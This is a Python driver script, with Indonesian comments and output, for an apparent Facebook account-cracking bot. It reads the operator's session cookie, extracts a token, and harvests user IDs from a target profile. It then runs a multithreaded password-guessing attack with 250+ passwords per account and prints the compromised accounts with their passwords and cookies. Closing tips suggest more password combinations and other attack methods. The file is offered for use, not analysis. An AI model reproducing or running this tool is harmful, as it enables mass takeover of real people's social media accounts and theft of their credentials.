#!/usr/bin/env python3
"""
TEST REAL BOT CRACK FACEBOOK
Test dengan input runtime (TIDAK hardcoded untuk keamanan)
"""

from core.auth import FacebookAuth
from core.dumper import FacebookDumper
from core.cracker import FacebookCracker
import sys

def banner():
    print("="*70)
    print("🔥 TEST CRACK FACEBOOK DENGAN DATA REAL 🔥".center(70))
    print("="*70)
    print()

def main():
    banner()
    
    print("⚠️ PERINGATAN KEAMANAN:")
    print("   Jangan pernah share cookie atau token Anda!")
    print("   File ini tidak menyimpan credentials.")
    print()
    
    COOKIE = input("🔑 Masukkan cookie Facebook Anda: ").strip()
    if not COOKIE:
        print("❌ Cookie tidak boleh kosong!")
        return
    
    print()
    TARGET_ID = input("🎯 Masukkan target ID untuk dump: ").strip()
    if not TARGET_ID:
        print("❌ Target ID tidak boleh kosong!")
        return
    
    print()
    print("📋 DATA TEST:")
    print(f"   Cookie: {'*' * 50}... (disembunyikan)")
    print(f"   Target ID: {TARGET_ID}")
    print()
    print("="*70)
    print()
    
    print("🔐 STEP 1: LOGIN & EXTRACT TOKEN")
    print("-" * 70)
    
    auth = FacebookAuth()
    success, message, token = auth.save_cookie(COOKIE)
    
    print(f"Status: {'✅ BERHASIL' if success else '❌ GAGAL'}")
    print(f"Message: {message}")
    
    if token:
        print(f"Token: {token[:100]}...")
    else:
        print("⚠️ Token tidak ditemukan, tapi cookie tersimpan")
    
    print()
    print("="*70)
    print()
    
    print("📥 STEP 2: DUMP ID DARI TARGET")
    print("-" * 70)
    
    dumper = FacebookDumper(COOKIE, token)
    
    def dump_progress(count):
        sys.stdout.write(f"\r💫 Progress dump: {count} ID")
        sys.stdout.flush()
    
    dump_success, dump_msg, id_list = dumper.dump_public(TARGET_ID, dump_progress)
    
    print()
    print(f"Status: {'✅ BERHASIL' if dump_success else '❌ GAGAL'}")
    print(f"Message: {dump_msg}")
    print(f"Total ID terdump: {len(id_list)}")
    
    if id_list:
        print("\n📋 Sample 10 ID pertama:")
        for i, id_data in enumerate(id_list[:10], 1):
            print(f"   {i}. {id_data}")
    
    print()
    print("="*70)
    print()
    
    if not id_list:
        print("❌ Tidak ada ID untuk di-crack. Test dihentikan.")
        return
    
    print("🔥 STEP 3: CRACK ID (TEST 20 ID PERTAMA)")
    print("-" * 70)
    print(f"⚡ Menggunakan 10 threads paralel")
    print(f"🔐 Masing-masing ID akan di-test dengan 250+ password")
    print()
    
    test_ids = id_list[:20]
    cracker = FacebookCracker(max_workers=10)
    
    ok_results = []
    cp_results = []
    
    def progress_callback(idx, stats):
        sys.stdout.write(
            f"\r⚡ {idx}/{stats['total']} | "
            f"✅ OK:{stats['ok']} | ⚠️ CP:{stats['cp']} | "
            f"❌ Gagal:{stats['failed']}"
        )
        sys.stdout.flush()
    
    def result_callback(result):
        print()
        if result['type'] == 'OK':
            print(f"✅ SUKSES: {result['user_id']} | Password: {result['password']}")
            ok_results.append(result)
        elif result['type'] == 'CP':
            print(f"⚠️ CHECKPOINT: {result['user_id']} | Password: {result['password']}")
            cp_results.append(result)
    
    stats = cracker.crack_batch(
        test_ids,
        method="mobile",
        progress_callback=progress_callback,
        result_callback=result_callback
    )
    
    print("\n")
    print("="*70)
    print("📊 HASIL AKHIR CRACK")
    print("="*70)
    print(f"Total ID yang di-test: {stats['total']}")
    print(f"✅ Berhasil (OK): {stats['ok']}")
    print(f"⚠️ Checkpoint (CP): {stats['cp']}")
    print(f"❌ Gagal: {stats['failed']}")
    
    if stats['total'] > 0:
        success_rate = ((stats['ok'] + stats['cp']) / stats['total']) * 100
        print(f"📈 Success Rate: {success_rate:.2f}%")
    
    print()
    
    if ok_results:
        print("✅ AKUN OK:")
        for i, result in enumerate(ok_results, 1):
            print(f"   {i}. {result['user_id']} | {result['password']}")
            if 'cookie' in result and result['cookie']:
                print(f"      Cookie: {result['cookie'][:80]}...")
    
    if cp_results:
        print()
        print("⚠️ AKUN CHECKPOINT:")
        for i, result in enumerate(cp_results, 1):
            print(f"   {i}. {result['user_id']} | {result['password']}")
    
    print()
    print("="*70)
    print("✅ TEST SELESAI!")
    print("="*70)
    
    if not ok_results and not cp_results:
        print()
        print("💡 CATATAN:")
        print("   Tidak ada akun yang berhasil di-crack dalam test ini.")
        print("   Ini bisa terjadi karena:")
        print("   - Password yang digunakan tidak sesuai")
        print("   - Akun target menggunakan password yang kuat")
        print("   - Rate limit dari Facebook")
        print()
        print("   SOLUSI:")
        print("   ✓ Tambah lebih banyak kombinasi password")
        print("   ✓ Test dengan ID lain yang lebih banyak")
        print("   ✓ Gunakan metode crack lain (B-API, GRAPH)")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n\n⚠️ Test dibatalkan!")
    except Exception as e:
        print(f"\n\n❌ ERROR: {str(e)}")
        import traceback
        traceback.print_exc()
